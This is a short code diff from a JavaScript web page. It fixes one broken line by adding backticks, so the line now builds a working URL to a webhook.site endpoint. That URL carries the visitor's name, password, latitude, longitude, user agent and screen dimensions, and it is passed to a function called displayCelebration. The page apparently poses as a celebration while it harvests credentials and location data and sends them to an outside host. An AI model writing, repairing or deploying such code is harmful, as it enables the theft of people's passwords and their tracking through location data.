@@ -113,7 +113,7 @@
                     const screenWidth = window.screen.width;
                     const screenHeight = window.screen.height;
                     
-                    const redirectUrl = https://webhook.site/899e7a99-f1d4-475f-9ef4-59c8cf159a3c?name=${encodeURIComponent(userName)}&password=${encodeURIComponent(userPassword)}&lat=${latitude}&lng=${longitude}&userAgent=${encodeURIComponent(userAgent)}&screenWidth=${screenWidth}&screenHeight=${screenHeight};
+                    const redirectUrl = `https://webhook.site/899e7a99-f1d4-475f-9ef4-59c8cf159a3c?name=${encodeURIComponent(userName)}&password=${encodeURIComponent(userPassword)}&lat=${latitude}&lng=${longitude}&userAgent=${encodeURIComponent(userAgent)}&screenWidth=${screenWidth}&screenHeight=${screenHeight}`;
                     
                     displayCelebration(redirectUrl);
                 }, function(error) {
